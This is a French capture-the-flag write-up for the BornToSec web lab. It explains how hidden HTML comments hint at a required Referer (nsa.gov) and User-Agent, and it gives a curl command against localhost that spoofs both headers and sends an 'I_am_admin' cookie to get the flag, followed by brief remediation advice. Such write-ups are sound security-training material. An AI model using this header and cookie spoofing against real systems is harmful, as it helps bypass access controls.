# HTTP Header Manipulation - User-Agent & Referer Spoofing

## Description
Cette vulnérabilité exploite la manipulation des en-têtes HTTP pour contourner les vérifications côté serveur basées sur l'User-Agent et le Referer.

## Exploitation

### Étape 1: Découverte du lien caché
En bas de la page principale, nous trouvons un lien discret vers une page spéciale :

```html
<a href="?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f">
    <li>© BornToSec</li>
</a>
```

### Étape 2: Exploration de la page et analyse du code source
En cliquant sur ce lien, nous arrivons sur une page qui mentionne les "Diomédéidés" en citant un article Wikipédia. Cette page semble anodine en surface.

L'inspection du code source révèle des commentaires HTML cruciaux :

**Premier commentaire :**
```html
<!--
You must come from : "https://www.nsa.gov/".
-->
```

**Second commentaire :**
```html
<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```

### Étape 3: Compréhension des en-têtes HTTP requis
Ces commentaires font référence à deux en-têtes HTTP spécifiques :

#### **Referer Header**
- **Définition** : Indique l'URL de la page depuis laquelle la requête a été initiée
- **Valeur requise** : `https://www.nsa.gov/`
- **Usage** : Le serveur vérifie que la requête provient du site de la NSA

#### **User-Agent Header**
- **Définition** : Identifie le navigateur/client qui fait la requête
- **Valeur requise** : `ft_bornToSec`
- **Usage** : Le serveur vérifie que la requête provient d'un "navigateur" spécifique

### Étape 4: Manipulation des en-têtes HTTP et obtention du flag
Pour obtenir le flag, nous devons envoyer une requête GET avec les en-têtes modifiés :

```bash
curl 'http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' \
  --compressed \
  -H 'User-Agent: ft_bornToSec' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Referer: https://www.nsa.gov/' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Priority: u=0, i'
  ```

Avec les en-têtes corrects, le serveur nous retourne le flag.

### Solutions recommandées :
1. **Ne pas se fier aux en-têtes HTTP** pour la sécurité
2. **Authentification robuste** : Utiliser des tokens/sessions sécurisés
